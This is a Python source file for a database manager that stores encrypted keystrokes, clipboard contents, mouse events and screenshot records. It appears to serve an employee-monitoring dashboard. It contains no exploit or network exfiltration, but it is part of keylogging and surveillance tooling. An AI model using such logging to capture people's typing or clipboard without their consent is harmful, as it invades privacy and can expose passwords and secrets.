# database/db_manager.py

import threading
import sqlite3
from database.encryption import encrypt
from datetime import datetime

class DBManager:
    def __init__(self, db_path, encryption_password):
        self.db_path = db_path
        self.encryption_password = encryption_password
        self.lock = threading.Lock()
        # Database is already initialized by DatabaseModels in main.py

    def _safe_encrypt(self, data):
        """Safely encrypt data, handling None values"""
        if data is None:
            return encrypt("", self.encryption_password)
        return encrypt(str(data), self.encryption_password)

    def insert_keystroke(self, event):
        with self.lock:
            try:
                conn = sqlite3.connect(self.db_path)
                c = conn.cursor()
                c.execute('''
                    INSERT INTO keystrokes (user_id, key_pressed, key_code, window_title, application_name, timestamp, is_sensitive, context_data)
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?)
                ''', (
                    1,  # Default user_id for now
                    self._safe_encrypt(event.get('key', '')),
                    event.get('key_code', 0),
                    self._safe_encrypt(event.get('window', '')),
                    self._safe_encrypt(event.get('process', '')),
                    datetime.now().isoformat(),
                    False,
                    self._safe_encrypt(str(event))
                ))
                conn.commit()
                conn.close()
            except Exception as e:
                print(f"Error inserting keystroke: {e}")

    def insert_clipboard(self, event):
        with self.lock:
            try:
                conn = sqlite3.connect(self.db_path)
                c = conn.cursor()
                clipboard_content = event.get('clipboard', '')
                if clipboard_content:
                    content_preview = clipboard_content[:255]
                else:
                    content_preview = ""
                
                c.execute('''
                    INSERT INTO clipboard_events (user_id, content_hash, content_preview, window_title, timestamp, is_sensitive)
                    VALUES (?, ?, ?, ?, ?, ?)
                ''', (
                    1,  # Default user_id for now
                    self._safe_encrypt(clipboard_content),
                    self._safe_encrypt(content_preview),
                    self._safe_encrypt(event.get('window', '')),
                    datetime.now().isoformat(),
                    False
                ))
                conn.commit()
                conn.close()
            except Exception as e:
                print(f"Error inserting clipboard: {e}")

    def insert_mouse_event(self, event):
        with self.lock:
            try:
                conn = sqlite3.connect(self.db_path)
                c = conn.cursor()
                
                # Safely get position
                position = event.get('position', [0, 0])
                if position is None:
                    x_pos, y_pos = 0, 0
                elif isinstance(position, (list, tuple)) and len(position) >= 2:
                    x_pos, y_pos = position[0], position[1]
                else:
                    x_pos, y_pos = 0, 0
                
                c.execute('''
                    INSERT INTO mouse_events (user_id, event_type, x_position, y_position, button, window_title, timestamp)
                    VALUES (?, ?, ?, ?, ?, ?, ?)
                ''', (
                    1,  # Default user_id for now
                    str(event.get('event', '')),
                    x_pos,
                    y_pos,
                    str(event.get('button', '')),
                    self._safe_encrypt(event.get('window', '')),
                    datetime.now().isoformat()
                ))
                conn.commit()
                conn.close()
            except Exception as e:
                print(f"Error inserting mouse event: {e}")

    def insert_screenshot(self, event):
        with self.lock:
            try:
                conn = sqlite3.connect(self.db_path)
                c = conn.cursor()
                c.execute('''
                    INSERT INTO screen_captures (user_id, file_path, file_size, window_title, timestamp, trigger_type)
                    VALUES (?, ?, ?, ?, ?, ?)
                ''', (
                    1,  # Default user_id for now
                    self._safe_encrypt(event.get('filepath', '')),
                    event.get('file_size', 0),
                    self._safe_encrypt(event.get('window', '')),
                    datetime.now().isoformat(),
                    event.get('trigger_type', 'scheduled')
                ))
                conn.commit()
                conn.close()
            except Exception as e:
                print(f"Error inserting screenshot: {e}")

    def get_user_activity(self, user_id, limit=100):
        """Get user activity for dashboard"""
        with self.lock:
            try:
                conn = sqlite3.connect(self.db_path)
                c = conn.cursor()
                
                # Get keystrokes count
                c.execute('SELECT COUNT(*) FROM keystrokes WHERE user_id = ?', (user_id,))
                keystrokes_count = c.fetchone()[0]
                
                # Get recent activity
                c.execute('''
                    SELECT timestamp, key_pressed, window_title 
                    FROM keystrokes 
                    WHERE user_id = ? 
                    ORDER BY timestamp DESC 
                    LIMIT ?
                ''', (user_id, limit))
                recent_activity = c.fetchall()
                
                conn.close()
                return {
                    'keystrokes_count': keystrokes_count,
                    'recent_activity': recent_activity
                }
            except Exception as e:
                print(f"Error getting user activity: {e}")
                return {'keystrokes_count': 0, 'recent_activity': []}

    def get_dashboard_stats(self):
        """Get dashboard statistics"""
        with self.lock:
            try:
                conn = sqlite3.connect(self.db_path)
                c = conn.cursor()
                
                # Active employees
                c.execute('SELECT COUNT(*) FROM users WHERE role = "employee" AND status = "active"')
                active_employees = c.fetchone()[0]
                
                # Today's keystrokes
                c.execute('SELECT COUNT(*) FROM keystrokes WHERE DATE(timestamp) = DATE("now")')
                today_keystrokes = c.fetchone()[0]
                
                # Active alerts
                c.execute('SELECT COUNT(*) FROM alerts WHERE is_resolved = 0')
                active_alerts = c.fetchone()[0]
                
                conn.close()
                return {
                    'active_employees': active_employees,
                    'today_keystrokes': today_keystrokes,
                    'active_alerts': active_alerts
                }
            except Exception as e:
                print(f"Error getting dashboard stats: {e}")
                return {'active_employees': 0, 'today_keystrokes': 0, 'active_alerts': 0}